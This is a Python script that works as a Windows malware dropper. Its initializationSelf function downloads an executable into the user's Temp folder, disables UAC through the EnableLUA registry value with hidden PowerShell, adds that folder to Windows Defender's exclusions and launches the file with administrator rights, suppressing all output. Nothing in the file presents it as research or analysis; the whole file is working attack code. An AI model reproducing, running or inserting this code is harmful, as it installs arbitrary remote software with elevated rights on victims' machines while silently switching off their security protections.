import os
import requests
import shutil
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

def get_temp_path():
    return Path(os.getenv('LOCALAPPDATA')) / 'Temp'

def download_file(url: str) -> Path:
    temp_dir = get_temp_path()
    temp_dir.mkdir(parents=True, exist_ok=True)
    response = requests.get(url, stream=True)
    response.raise_for_status()
    cd = response.headers.get('content-disposition')
    if cd:
        import re
        fname = re.findall('filename="?([^\'";]+)"?', cd)
        filename = fname[0] if fname else 'downloaded_program.exe'
    else:
        filename = 'downloaded_program.exe'
    file_path = temp_dir / filename
    with open(file_path, 'wb') as f:
        shutil.copyfileobj(response.raw, f)
    return file_path

def disable_uac():
    ps_script = '''
    $uacPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
    $uacProperty = "EnableLUA"
    Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0
    '''
    subprocess.run(
        ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=True
    )

def add_defender_exclusion(path: Path):
    cmd = f'powershell.exe Add-MpPreference -ExclusionPath "{path}"'
    subprocess.run(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False
    )

def run_as_admin(file_path: Path):
    launch_script = f'Start-Process -FilePath "{file_path}" -Verb runAs'
    subprocess.run(
        ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", launch_script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=True
    )

def _download_worker(url: str):
    try:
        return download_file(url)
    except:
        return None

def initializationSelf(url: str):
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(_download_worker, url) for _ in range(4)]
        results = [f.result() for f in futures if f.result() is not None]
    if not results:
        raise RuntimeError
    file_path = results[0]
    disable_uac()
    add_defender_exclusion(get_temp_path())
    run_as_admin(file_path)
